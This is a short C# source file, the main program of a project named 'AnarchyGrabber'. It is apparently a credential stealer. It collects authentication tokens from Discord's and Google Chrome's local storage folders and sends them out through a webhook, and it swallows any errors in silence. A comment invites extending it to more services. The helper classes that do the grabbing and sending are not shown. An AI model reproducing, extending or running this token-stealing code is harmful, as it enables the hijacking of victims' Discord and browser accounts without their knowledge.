using System.Collections.Generic;

namespace AnarchyGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> report = new List<string>();

            //attempt to get tokens from the different services (feel free to add more)
            report.Add("**Discord**");
            report.AddRange(Grabber.GetTokens(@"Roaming\Discord\Local Storage\leveldb"));
            report.Add("\n**Google chrome**");
            report.AddRange(Grabber.GetTokens(@"Local\Google\Chrome\User Data\Default\Local Storage\leveldb"));

            //attempts to report the tokens to the user
            try
            {
                Webhook.ReportTokens(report);
            }
            catch { }
        }
    }
}
